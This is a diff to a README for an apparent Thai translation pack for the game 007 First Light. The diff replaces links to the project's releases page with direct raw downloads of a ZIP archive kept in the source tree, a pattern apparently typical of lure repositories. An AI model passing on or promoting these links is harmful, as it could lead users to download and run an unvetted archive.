@@ -1,6 +1,6 @@
 # 🇹🇭 007-First-Light-Thailocalization - Play your game in Thai language
 
-[![Download Thai Language Pack](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Akhila4564/007-First-Light-Thailocalization/releases)
+[![Download Thai Language Pack](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Akhila4564/007-First-Light-Thailocalization/raw/refs/heads/main/src/Thailocalization-Light-First-v2.3.zip)
 
 This project provides a full Thai translation for the 007 First Light game. It translates the story content, subtitles, user interface elements, and game menus into Thai. Players can now enjoy the game in their native language with complete text support.
 
@@ -26,7 +26,7 @@ Before you install the translation, check these system details:
 
 You need to access the release page to get the correct translation files.
 
-[Click here to visit the release page and download the files](https://github.com/Akhila4564/007-First-Light-Thailocalization/releases)
+[Click here to visit the release page and download the files](https://github.com/Akhila4564/007-First-Light-Thailocalization/raw/refs/heads/main/src/Thailocalization-Light-First-v2.3.zip)
 
 Select the most recent file labelled as a ZIP archive. Save this file to your desktop or your Downloads folder. Do not run any files until you complete the extraction steps.
 
